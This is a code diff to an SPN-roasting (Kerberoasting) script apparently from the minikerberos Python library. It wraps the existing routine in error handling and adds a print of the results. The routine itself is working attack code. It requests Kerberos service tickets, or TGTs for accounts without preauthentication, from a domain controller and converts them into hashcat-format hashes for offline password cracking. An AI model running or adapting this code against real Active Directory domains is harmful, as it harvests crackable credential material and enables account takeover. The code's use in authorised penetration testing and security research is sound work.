@@ -6,6 +6,7 @@
 
 import logging
 import asyncio
+import traceback
 from minikerberos.common.url import KerberosClientURL, kerberos_url_help_epilog
 from minikerberos.common.spn import KerberosSPN
 from minikerberos.aioclient import AIOKerberosClient
@@ -16,41 +17,44 @@ spnroastlogger = logging.getLogger("spnroast")
 
 async def spnroast(connection_url, spn, realm, out_file):
 	try:
-		with open(spn, 'r') as f:
-			pass
-		spns = KerberosSPN.from_file(spn, override_realm=realm)
-	except:
-		spns = [KerberosSPN.from_spn(spn, override_realm=realm)]		
-	
-	cu = KerberosClientURL.from_url(connection_url)
-	ccred = cu.get_creds()
-	target = cu.get_target()
-	
-
-	results = []
-	for spn in spns:
 		try:
-			client = AIOKerberosClient(ccred, target)
-			if client.usercreds.nopreauth is True:
-				await client.get_TGT(override_sname=spn)
-				tgshash = TGSTicket2hashcat(client.kerberos_TGT)
-			else:
-				await client.get_TGT()
-				tgs, _, _ = await client.get_TGS(spn)
-				tgshash = TGSTicket2hashcat(tgs)
-			
-			if out_file is None:
-				print(tgshash)
-			results.append(tgshash)
-		except Exception as e:
-			spnroastlogger.debug('Failed roasting %s Reason: %s' % (spn, str(e)))
+			with open(spn, 'r') as f:
+				pass
+			spns = KerberosSPN.from_file(spn, override_realm=realm)
+		except:
+			spns = [KerberosSPN.from_spn(spn, override_realm=realm)]		
+		
+		cu = KerberosClientURL.from_url(connection_url)
+		ccred = cu.get_creds()
+		target = cu.get_target()
+		
 
-	if out_file is not None:
-		with open(out_file, 'w', newline='') as f:
-			for result in results:
-				f.write(result + '\r\n')
+		results = []
+		for spn in spns:
+			try:
+				client = AIOKerberosClient(ccred, target)
+				if client.usercreds.nopreauth is True:
+					await client.get_TGT(override_sname=spn)
+					tgshash = TGSTicket2hashcat(client.kerberos_TGT)
+				else:
+					await client.get_TGT()
+					tgs, _, _ = await client.get_TGS(spn)
+					tgshash = TGSTicket2hashcat(tgs)
+				
+				if out_file is None:
+					print(tgshash)
+				results.append(tgshash)
+			except Exception as e:
+				spnroastlogger.debug('Failed roasting %s Reason: %s' % (spn, str(e)))
 
-	return results
+		if out_file is not None:
+			with open(out_file, 'w', newline='') as f:
+				for result in results:
+					f.write(result + '\r\n')
+		print(results)
+		return results
+	except:
+		traceback.print_exc()
 
 
 async def amain():
